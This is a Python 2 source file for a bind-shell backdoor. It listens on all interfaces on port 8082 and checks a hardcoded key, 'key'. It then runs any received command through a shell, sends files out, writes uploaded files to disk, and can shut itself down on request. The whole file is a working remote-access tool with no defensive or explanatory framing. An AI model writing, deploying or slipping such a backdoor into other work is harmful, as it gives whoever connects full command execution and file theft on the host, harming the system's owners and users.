import socket,time,subprocess,random,sys,getopt,os

def connections(s,startdir,key):
  os.chdir(startdir) 
  #print os.getcwd()
  try:
        single=True
        (c, address) = s.accept()
        c.settimeout(300)
        x=c.recv(1024)
        if x!=key:
            #c.send("bad_key")
            return
        #c.send("you want....\n")

        while 1:
            single=True
            cwd=os.getcwd()
            c.send("\n"+cwd+": ")
            req=c.recv(1024)
            if req[:4]=="EXIT":
                single=False
                c.send("Exiting\n\n")
                c.close()
                break
            if req[:4]=="KILL":
                single=False
                c.send("Are you sure?  Press 'Y' to confirm\n")
                kill=c.recv(1024)
                kill=kill[:1]
                c.send(kill)
                if (kill=="Y"):
                    c.send("\n\nKilling the server...this cannot be undone\n\n")
                    c.close()
                    s.close()
                    sys.exit()
                else:
                    c.send("\n\nKill cancelled")
            if (req[:2]=="cd" and req[2]==" "):
                single=False
                newdir=req[3:]
                try:
                    os.chdir(newdir)
                except:
                    c.send("No such file or directory")
            if req[:4]=="DOWN":
                single=False
                try:
                    req=req.split(' ')
                    c.send("Preparing to send file")
                    time.sleep(1)
                    f = open (req[1], "rb")
                    l = f.read(1024)
                    while (l):
                        c.send(l)
                        l = f.read(1024)
                    f.close()
                    time.sleep(5)
                    continue
                except:
                    c.send("Unable to retrieve file")    
                    continue
            if req[:2]=="UP":
              single=False
              try:
                req=req.split(' ')
                f = open(req[2],'wb')
                time.sleep(1)
                l=c.recv(1024)
                while len(l)==1024:
                    f.write(l)
                    l = c.recv(1024)
                f.write(l)
                f.close()
                time.sleep(3)
                c.send("File Complete")
                continue
              except Exception as e:
                print "Cannot get file"
                print str(e)
                continue

            if single:
                prochandle = subprocess.Popen(req,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                time.sleep(.5)
                prochandle.poll()
                proc_wait=0
                proc_max=15
                while (prochandle.returncode==None) and (proc_wait<proc_max):
                    time.sleep(1)
                    proc_wait+=1
                    prochandle.poll()
                    results="Process took too long"
                if prochandle.returncode==None:
                    results="Process took too long to complete...check process list for hung processes"
                    prochandle.kill()
                else:
                    results=prochandle.communicate()[0]
                c.send(results)
                

  except Exception as e:
        print str(e)
        #break 
  #s.close()



def main():
    key="key"    
    port=8082
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    start_dir=os.getcwd()
    s.bind(('0.0.0.0', port))
    s.listen(1)
    while True:
        connections(s,start_dir,key)
        


if __name__ == "__main__":
    main()

